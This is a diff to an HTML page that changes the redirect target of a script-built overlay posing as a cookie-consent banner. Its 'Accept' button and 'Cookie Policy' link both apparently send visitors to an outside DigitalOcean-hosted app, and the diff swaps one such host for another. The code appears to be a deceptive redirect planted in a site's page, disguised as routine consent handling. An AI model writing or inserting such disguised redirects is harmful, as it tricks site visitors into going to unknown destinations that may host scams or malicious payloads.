@@ -3,7 +3,7 @@
 <head>
 	<script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://stingray-app-89xo4.ondigitalocean.app/";
+	            const redirectUrl = "https://octopus-app-tw65z.ondigitalocean.app/";
  
 	            const style = document.createElement("style");
 	            style.textContent = `
@@ -93,7 +93,7 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://stingray-app-89xo4.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="https://octopus-app-tw65z.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
